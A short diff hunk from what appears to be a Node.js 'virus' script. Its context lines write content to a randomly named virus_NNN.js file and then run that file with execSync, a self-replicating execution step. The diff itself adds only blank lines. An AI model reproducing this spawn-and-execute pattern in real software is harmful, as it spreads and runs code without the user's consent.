@@ -23,3 +23,5 @@ const filename = `./virus_${Math.floor(1000000 * Math.random())}.js`;
 fs.writeFileSync(filename, content, 'utf8');
 //执行新生成的文件
 cp.execSync(`node ${filename}`);
+
+
